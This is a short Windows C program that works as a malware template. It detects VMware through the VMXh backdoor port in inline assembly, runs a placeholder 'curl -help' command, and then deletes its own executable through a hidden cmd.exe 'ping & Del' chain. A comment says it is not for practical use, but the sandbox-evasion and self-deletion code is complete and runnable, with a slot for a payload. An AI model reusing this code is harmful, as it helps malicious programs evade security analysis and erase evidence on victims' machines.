/*
DO NOT
- build under the unicode
- use this in practice
- change curl option
*/

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <strsafe.h>
#pragma comment(lib, "user32.lib")
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

UCHAR checkVMware1()
{
	UCHAR rslt = 0;
	__try {
		__asm {
			push edx
			push ecx
			push ebx
			mov  eax, 'VMXh'
			mov  ebx, 0
			mov  ecx, 10
			mov  edx, 'VX'
			in   eax, dx
			cmp  ebx, 'VMXh'
			setz[rslt]
			pop  ebx
			pop  ecx
			pop  edx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
	}
	return rslt;
}

void do_or_die() {
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	exit(0);
}

int main() {

	if (checkVMware1()) {
		do_or_die();
	}

	system("curl -help");
	do_or_die();

	return 0;
}